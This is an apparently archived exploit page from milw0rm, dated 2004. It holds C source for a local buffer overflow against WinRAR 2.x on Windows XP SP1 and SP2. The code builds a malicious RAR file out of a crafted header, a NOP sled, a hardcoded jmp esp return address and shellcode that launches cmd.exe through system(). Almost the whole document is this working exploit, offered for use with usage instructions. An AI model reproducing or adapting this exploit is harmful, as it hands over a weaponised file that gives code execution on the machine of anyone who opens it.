<html><head><title>WinRAR 1.0 Local Buffer Overflow Exploit</title></head><pre>/*
* WinRar local buffer overflow exploit V1.0
* Coded By ATmaCA
* Copyright © 2004 ProGroup Software, Inc.
* E-Mail:atmaca@prohack.net
* Web:www.prohack.net
* Usage:\r\nexploit &lt;Target&gt; &lt;OutputPath&gt;
* Targets:
* 1 - WinXP SP1 user32.dll [0x77D718FC]
* 2 - WinXP SP2 user32.dll [0x77D8AF0A]
* Example:exploit 1 myrar.rar
*/

/*
* All WinRar 2.x series are effected
* 3.x series not effected
* If you want to test and you do not have WinRar V2.x
* You can download it from http://atmaca.prorat.net/Src/winrar.zip
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;conio.h&gt;

#ifdef __BORLANDC__
       #include &lt;mem.h&gt;
#endif

#define NOP 0x90

/*crafted rar header*/
char winrar_header[] =
&quot;\x52\x61\x72\x21\x1A\x07\x00\xCF\x90\x73\x00\x00\x0D\x00\x00\x00&quot;
&quot;\x00\x00\x00\x00\x4A\x91\x74\x80\x80\x35\x00\x00\x00\x00\x00\x00&quot;
&quot;\x00\x00\x00\x02\x00\x00\x00\x00\x12&quot;;

/*launch a local cmd.exe*/
char shellcode[]=
&quot;\x68&quot;                    // push
&quot;cmd &quot;                    // cmd
&quot;\x8B\xC4&quot;                // mov eax,esp
&quot;\x50&quot;                    // push eax
&quot;\xB8\xc7\x93\xC2\x77&quot;    // mov eax,77C293C7 (address of system() on WinXP SP2
- msvcrt.dll)
&quot;\xFF\xD0&quot;                // call eax
;

char *target[]=  //return addr
{
       &quot;\xFC\x18\xD7\x77&quot;,   //User32 jmp esp addr  WinXp Sp1
       &quot;\x0A\xAF\xD8\x77&quot;    //User32 jmp esp addr  WinXp Sp2
};

char *sysadrr[]=
{
       &quot;\x44\x80\xC2\x77&quot;,   //77C28044 XP Sp1  msvcrt.dll system()
       &quot;\xC7\x93\xC2\x77&quot;    //77C293C7 XP Sp2  msvcrt.dll system()
};

FILE   *di;
int    targetnum;
int    i;

void main(int argc, char *argv[])
{

       if (argc &lt; 3)
       {
                printf(&quot;\r\nWinRar local buffer overflow exploit V1.0\r\n&quot;,
argv[0]);
                printf(&quot;Coded By ATmaCA\r\n&quot;);
                printf(&quot;Copyright © 2004 ProGroup Software, Inc.\r\n&quot;);
                printf(&quot;E-Mail:atmaca@prohack.net\r\n&quot;);
                printf(&quot;Web:www.prohack.net\r\n\r\n&quot;);
                printf(&quot;Usage:\r\nexploit &lt;Target&gt;
&lt;OutputPath&gt;\r\n\r\n&quot;,argv[0]);
                printf(&quot;Targets:\n&quot;);
                printf(&quot;1 - WinXP SP1 english user32.dll [0x77D718FC]\n&quot;);
                printf(&quot;2 - WinXP SP2 english user32.dll [0x77D8AF0A]\n&quot;);
                printf(&quot;Example:exploit 1 myrar.rar\n&quot;);

                return;
       }

       targetnum = atoi(argv[1]) - 1;

       if( (di=fopen(argv[2],&quot;wb&quot;)) == NULL )
       {
               printf(&quot;Error opening file!\n&quot;);
               return;
       }
       for(i=0;i&lt;sizeof(winrar_header)-1;i++)
               fputc(winrar_header[i],di);

       /*stuff in a couple of NOPs*/
       for(i=0;i&lt;1051;i++)
               fputc(NOP,di);

       fprintf(di,&quot;%s&quot;,target[targetnum]); //EIP

       for(i=0;i&lt;50;i++) //NOPs
               fputc(NOP,di);

       memcpy(shellcode+9,sysadrr[targetnum],4); //system() addr

       /*Overwriting the return address (EIP) with JMP ESP address
       located somewhere in process space */
       for(i=0;i&lt;sizeof(shellcode)-1;i++)
               fputc(shellcode[i],di);

       for(i=0;i&lt;50;i++) //NOPs
               fputc(NOP,di);

       printf(&quot;Exploit rar file %s has been generated!\n&quot;,argv[2]);

       fclose(di);
}

// milw0rm.com [2004-09-28]</pre></html>